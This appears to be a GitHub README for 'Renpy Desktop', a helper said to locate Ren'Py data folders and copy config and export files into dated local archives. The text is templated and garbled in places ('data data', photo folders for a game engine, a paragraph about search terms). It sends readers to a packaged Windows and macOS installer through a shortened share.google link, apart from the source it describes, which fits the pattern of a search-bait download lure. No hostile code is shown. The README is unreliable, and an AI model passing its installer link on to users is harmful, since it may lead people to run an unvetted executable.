# Renpy Desktop

*Dated copies of Renpy data data, nothing uploaded.*

## About

**Renpy Desktop** is a desktop helper. A desktop helper that finds Renpy data directories and archives config and export files locally.

Renpy drops data files next to launcher caches.

Files stay on the machine that runs the tool. Originals are left alone unless you choose otherwise.

## Editions

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## Highlights

- Finds the Renpy data directory.
- Copies config and export files to a dated archive.
- Lists photo and export folders.
- Writes a short report of what was kept.

## Background

People search Renpy desktop and PC when they want the folder on disk.

A named helper is easier to find than a generic zip.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.
